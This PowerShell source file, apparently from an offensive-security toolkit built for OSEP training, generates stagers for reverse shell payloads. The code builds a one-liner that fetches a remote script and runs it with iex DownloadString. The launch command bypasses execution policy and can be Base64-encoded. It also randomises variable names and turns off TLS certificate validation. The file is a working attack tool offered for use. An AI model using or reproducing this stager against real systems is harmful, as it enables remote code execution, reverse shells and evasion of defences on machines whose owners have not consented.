function Get-Stager {
#.SYNOPSIS
# Simple PowerShell stager generator to point to a web hosted RevShell payload. 
# ARBITRARY VERSION NUMBER:  2.0.1
# AUTHOR:  Tyler McCann (@tylerdotrar)
#
#.DESCRIPTION
# Originally developed for OSEP, this script is meant to create really simple custom stagers
# that point to reverse shell payloads.  The only robust portion of this script is the that
# it allows communication with the PMA server over HTTPS by preloading the stager with a 
# self-signed certificate bypass if the payload URL uses HTTPS.
#
# Parameters:
#   -PayloadURL  -->  URL pointing to the reverse shell payload
#   -Base64      -->  Encode stager output
#   -Help        -->  Return Get-Help information
#
#.LINK
# https://github.com/tylerdotrar/PoorMansArmory


    Param(
        # Primary Parameters
        [string]$PayloadURL = 'http(s)://<ip_addr>/d/<revshell>',
        [switch]$Base64,
        [switch]$Help
    )
    

    # Return Get-Help Information
    if ($Help) { return Get-Help Get-Stager }


    # Error Correction
    if ($PayloadURL -eq 'http(s)://<ip_addr>/d/<revshell>') { return (Write-Host 'Missing reverse shell URL.' -ForegroundColor Red) }
    if ($PayloadURL -notlike "http*") { return (Write-Host 'Invalid URL.' -ForegroundColor Red) }


    # Randomly generate 4 - 10 character variable names
    function Get-RandVar {
        $RanVar = '$'
        for ($i=0; $i -lt (Get-Random -Maximum 5 -Minimum 2); $i++) {
            $RanVar += Get-Random -InputObject ([char[]](([char]'a')..([char]'z')))
            $RanVar += Get-Random -InputObject ([char[]](([char]'A')..([char]'Z')))
        }
        return $RanVar
    }


    # Randomly Generate Variables in Payload
    $Var1 = Get-RandVar # CertBypass


    # Bypass Self-Signed Certificate Restriction
    if ($PayloadURL -like "https:*") {
    $Bypass = @"
$Var1 = @'
using System;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
public class SelfSignedCerts
{
    public static void Bypass()
    {
        ServicePointManager.ServerCertificateValidationCallback =
            delegate
            (
                Object obj,
                X509Certificate certificate,
                X509Chain chain,
                SslPolicyErrors errors
            )
            {
                return true;
            };
    }
}
'@
Add-Type $Var1;
[SelfSignedCerts]::Bypass();`n
"@;
    }
    else { $Bypass = $NULL }


    # Final Payload
    $Stager = $Bypass + "iex ((New-Object [System.Net.WebClient]).DownloadString('$PayloadURL'))"


    # PowerShell -NoProfile -ExecutionPolicy Bypass -Command/EncodedCommand {Stager}
    if ($Base64) { $Payload = "powershell -nop -ex bypass -e " + [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($Stager)) }
    else         { $Payload = "powershell -nop -ex bypass -c {$Stager}" }


    return $Payload
}